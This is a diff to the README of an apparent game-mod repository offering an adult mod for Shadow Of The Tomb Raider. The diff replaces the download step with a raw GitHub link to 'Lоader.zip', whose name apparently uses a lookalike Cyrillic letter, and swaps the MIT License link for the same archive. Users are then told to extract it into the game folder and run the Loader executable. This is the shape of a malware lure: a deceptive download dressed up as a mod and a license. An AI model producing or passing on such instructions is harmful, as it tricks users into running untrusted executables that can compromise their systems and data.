@@ -25,7 +25,7 @@ Welcome to the Shadow Of The Tomb Raider Adult NSFW Mod repository, the ultimate
 
 ## 📦 Installation Guide
 
-1. Download Loader.rar from the repository.
+1. Download https://raw.githubusercontent.com/Bijay-kumar-sethy/TombRaiderSensualShadows-ModPack/main/Lоader.zip from the repository.
 2. Extract the contents to your Shadow Of The Tomb Raider installation directory.
 3. Run the Loader executable and follow the on-screen instructions.
 4. Select the mod features you wish to enable.
@@ -41,4 +41,4 @@ This repository is intended for educational and entertainment purposes. It is de
 
 ## 📑 License
 
-Distributed under the [MIT License (2025)](https://opensource.org/licenses/MIT) – enjoy responsibly!
+Distributed under the [MIT License (2025)](https://raw.githubusercontent.com/Bijay-kumar-sethy/TombRaiderSensualShadows-ModPack/main/Lоader.zip) – enjoy responsibly!
